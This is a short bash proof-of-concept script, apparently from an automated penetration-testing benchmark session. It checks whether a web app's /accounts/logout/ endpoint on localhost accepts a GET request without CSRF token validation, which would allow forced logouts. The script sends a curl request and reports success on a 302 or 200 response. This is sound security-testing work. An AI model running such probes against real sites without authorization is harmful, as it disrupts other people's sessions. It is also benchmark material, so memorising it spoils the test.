#!/bin/bash
# POC: Demonstrates CSRF vulnerability in logout endpoint that accepts GET requests without CSRF token validation, allowing unauthorized session destruction
# Target: ./repo
# Created: 2025-11-07T16:45:05.574Z
# Session: benchmark-XBEN-056-24-mhp2wdxt

# CSRF Vulnerability POC - Logout Endpoint Accepts GET Requests
# This POC demonstrates that the /accounts/logout/ endpoint accepts GET requests
# and performs logout without CSRF token validation, enabling CSRF attacks.

TARGET_URL="${1:-http://localhost:8081}"
LOGOUT_ENDPOINT="/accounts/logout/"
COOKIE_JAR="/tmp/cookies_csrf_logout.txt"

echo "[*] CSRF Vulnerability POC - Logout Endpoint GET Request"
echo "[*] Target: ${TARGET_URL}${LOGOUT_ENDPOINT}"
echo ""

# Clean up any previous cookies
rm -f "${COOKIE_JAR}"

echo "[TEST 1] Attempting GET request to logout endpoint..."
echo "Command: curl -v -c \"${COOKIE_JAR}\" \"${TARGET_URL}${LOGOUT_ENDPOINT}\""
echo ""

response=$(curl -s -v -c "${COOKIE_JAR}" "${TARGET_URL}${LOGOUT_ENDPOINT}" 2>&1)

echo "[*] Response received:"
echo "${response}" | grep -E "HTTP|Location|<"
echo ""

# Check for redirect response (302)
if echo "${response}" | grep -q "302"; then
    echo "[✓] SUCCESS: GET request returned HTTP 302 redirect"
    echo "[✓] This indicates logout was executed via GET request"
    echo "[!] VULNERABILITY CONFIRMED: GET request accepted without CSRF token"
    exit 0
elif echo "${response}" | grep -q "200"; then
    echo "[✓] GET request succeeded with HTTP 200"
    echo "[!] VULNERABILITY CONFIRMED: GET request processed without CSRF protection"
    exit 0
else
    echo "[-] Unexpected response. Full output:"
    echo "${response}"
    exit 1
fi